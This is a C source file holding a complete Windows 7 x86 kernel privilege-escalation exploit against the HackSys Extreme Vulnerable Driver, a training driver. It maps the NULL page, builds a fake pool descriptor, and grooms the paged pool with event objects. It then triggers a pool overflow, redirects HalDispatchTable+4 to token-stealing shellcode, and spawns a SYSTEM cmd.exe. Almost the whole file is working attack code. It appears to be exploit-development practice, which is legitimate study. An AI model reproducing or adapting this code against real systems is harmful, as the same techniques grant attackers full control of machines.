#include<stdio.h>
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


//From http://stackoverflow.com/a/26414236 this defines the details of the NtAllocateVirtualMemory function
//which we will use to map the NULL page in user space.
typedef NTSTATUS(WINAPI* PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource,
	OUT PULONG Interval);

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID

VOID Shllecode() {

	_asm
	{
		//int 3
		pop edi
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		//int 3
		ret
	}
	
}

int main()
{
	DWORD lpBytesReturned;
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\HackSysExtremeVulnerableDriver";

	HANDLE hDriver = CreateFileA(lpDeviceName,			
		GENERIC_READ | GENERIC_WRITE,					
		FILE_SHARE_READ | FILE_SHARE_WRITE,				
		NULL,											
		OPEN_EXISTING,									
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,	
		NULL);											

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}
	printf("Got the device Handle: 0x%X\r\n", hDriver);

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

	if (hNtdll == INVALID_HANDLE_VALUE) {
		printf("Could not open handle to ntdll. \n");
		CloseHandle(hDriver);
		return 1;
	}

	
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");;

	if (!NtAllocateVirtualMemory) {
		printf("Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 1;
	}

	PVOID baseAddress = (PVOID)0x1;
	SIZE_T regionSize = 0x2500;
								
	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), 
		&baseAddress, 
		0, 
		&regionSize, 
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, 
		PAGE_EXECUTE_READWRITE 
	);

	if (ntStatus != 0) {
		printf("Virtual Memory Allocation Failed: 0x%x\n", ntStatus);
		return 1;
	}

	printf("Address allocated at: 0x%p\n", baseAddress);
	printf("Allocated memory size: 0x%X\n", regionSize);

	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);
	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("Could not allocate memory for module info.\n");
		return 1;
	}
	query(SystemModuleInformation, pModuleInfo, len, &len);
	if (len == 0) {
		printf("Failed to retrieve system module information\n");
		return 1;
	}
	PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;
	PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[0].Name;
	kernelImage = strrchr(kernelImage, '\\') + 1;
	printf("Kernel Image Base 0x%X\n", kernelImageBase);
	printf("Kernel Image name %s\n", kernelImage);

	HMODULE userBase = LoadLibraryA(kernelImage);
	PVOID dispatch = (PVOID)GetProcAddress(userBase, "HalDispatchTable");
	dispatch = (PVOID)((ULONG)dispatch - (ULONG)userBase + (ULONG)kernelImageBase);
	printf("User Mode kernel image base address: 0x%X\n", userBase);
	printf("Kernel mode kernel image base address: 0x%X\n", kernelImageBase);
	printf("HalDispatchTable address: 0x%X\n", dispatch);

	ULONG what = (ULONG)&Shllecode;
	ULONG where = (ULONG)((ULONG)dispatch + sizeof(PVOID));

	HANDLE hDefragEvents[0x2500];
	HANDLE hPoolGroomEvents[0x2500];

	RtlZeroMemory((PCHAR)0x0, 0x1300);
	//Create a fake POOL_DESCRIPTOR ,the values were yoinked straight from https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp
	//dt - r nt!_POOL_DESCRIPTOR	
	*(PCHAR)0x0 = 1;
	//+ 0x000 PoolType         : PagedPool = 0n1
	*(PCHAR)0x4 = 1;
	//+0x004 PagedLock        : _KGUARDED_MUTEX
	*(PCHAR*)0x100 = (PCHAR)0x1208;
	//+ 0x100 PendingFrees : 0x1208 //This address will be written to the targetted 'where' address

	*(PCHAR*)0x104 = (PCHAR)0x20;
	//+0x104 PendingFreeDepth : 0x20 - the pending free needs to be atleast 32 to so that ExFreePoolWithTag actually free's everything

	for (unsigned int i = 0x140; i < 0x1140; i += 8) {
		*(PCHAR*)i = (PCHAR)where - 4;
	}
	//+0x140 ListHeads : [512] _LIST_ENTRY
		//+ 0x000 Flink : (PCHAR)where - 4
		//+ 0x004 Blink : (PCHAR)where - 4
		//And repeat...
	//The addresses of the object on the PendingFrees list which is currently 0x1208 will be written to the 'where' address when it is linked into the fron of the list

//Create fake Pool headers
	*(PINT)0x1200 = (INT)0x060c0a00;
	*(PINT)0x1204 = (INT)0x6f6f6f6f;
	//dt nt!_POOL_HEADER 0x1200
	//+0x000 PreviousSize     : 0y000000000(0)
	//	+ 0x000 PoolIndex : 0y0000101(0x5)
	//	+ 0x002 BlockSize : 0y000001100(0xc)
	//	+ 0x002 PoolType : 0y0000011(0x3)
	//	+ 0x000 Ulong1 : 0x60c0a00
	//	+ 0x004 PoolTag : 0x6f6f6f6f
	//	+ 0x004 AllocatorBackTraceIndex : 0x6f6f
	//	+ 0x006 PoolTagHash : 0x6f6f
	*(PCHAR*)0x1208 = (PCHAR)0x0; //the next pointer for the pending free list, as this is NULL it will stop free'ing
	*(PINT)0x1260 = (INT)0x060c0a0c;
	*(PINT)0x1264 = (INT)0x6f6f6f6f;
	//dt nt!_POOL_HEADER 0x1260
	//+0x000 PreviousSize     : 0y000001100(0xc)
	//	+ 0x000 PoolIndex : 0y0000101(0x5)
	//	+ 0x002 BlockSize : 0y000001100(0xc)
	//	+ 0x002 PoolType : 0y0000011(0x3)
	//	+ 0x000 Ulong1 : 0x60c0a0c
	//	+ 0x004 PoolTag : 0x6f6f6f6f
	//	+ 0x004 AllocatorBackTraceIndex : 0x6f6f
	//	+ 0x006 PoolTagHash : 0x6f6f
	HANDLE spray_event[0x10000];
	for (int i = 0; i < 0x10000; i++)
		spray_event[i] = CreateEvent(NULL, FALSE, FALSE, TEXT(""));
	for (int i = 0; i < 0x10000; i += 0x10) {
		for (int j = 0; j < 8; j++)
		{
			// 0x40 * 8 = 0x200
			HANDLE temp = spray_event[i + j];
			CloseHandle(temp);
		}
	}
	
	printf("Grooming complete - pool full o'holes\r\n");

	DWORD buf[0x300]{};
	size_t nInBufferSize = 0x1fc;

	memset(buf, 0x41, nInBufferSize);
	buf[0x1f8 / 4] = 0x06080a40;

	//dt nt!_POOL_HEADER  
	//  + 0x000 PreviousSize : Pos 0, 9 Bits  => 0x40  
	//	+ 0x000 PoolIndex : Pos 9, 7 Bits => 0x5 //Out of bounds
	//	+ 0x002 BlockSize Pos 0, 9 Bits => 0x8
	//	+ 0x002 PoolType : Pos 9, 7 Bits => 0x3 (Paged Pool)
	//	+ 0x000 Ulong1 : Uint4B => 0x06400a40 (Just a union field)
	//We stop overwriting after the first 4 bytes and leave the rest as default
	//	+ 0x004 PoolTag : Uint4B=> 0xee657645 => 'Even'
	//	+ 0x004 AllocatorBackTraceIndex : Uint2B => 0x7645
	//	+ 0x006 PoolTagHash : Uint2B => 0xee65

	DeviceIoControl(hDriver,0x22200F,buf,nInBufferSize,NULL,0,&lpBytesReturned,NULL);
	printf("Overflow triggered\r\n");

	for (int i = 0; i < 0x10000; i++)
	{
		if (spray_event[i]) CloseHandle(spray_event[i]);
	}

	//When the kernel tries to execute nt!HalDispatchTable+0x4 it will end up executing at 0x1208
	//Which has been preloaded with opcodes to execute our shellcode and then return
	/*00001208 b8ADDRESS      mov     eax, what
	0000120d ffd0            call    eax
	0000120f c9              leave
	00001210 c3              ret*/
	*(PUCHAR)0x1208 = 0xb8;
	*(PINT)0x1209 = (INT)what;
	*(PUCHAR)0x120D = 0xff;
	*(PUCHAR)0x120E = 0xd0;
	*(PUCHAR)0x120F = 0xc9;
	*(PUCHAR)0x1210 = 0xc3;
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtdll, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("Failed Resolving NtQueryIntervalProfile. \n");
		return 1;
	}
	ULONG interval = 1;
	NtQueryIntervalProfile(2, &interval);
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	CloseHandle(hDriver);
	getchar();
	return 0;
}
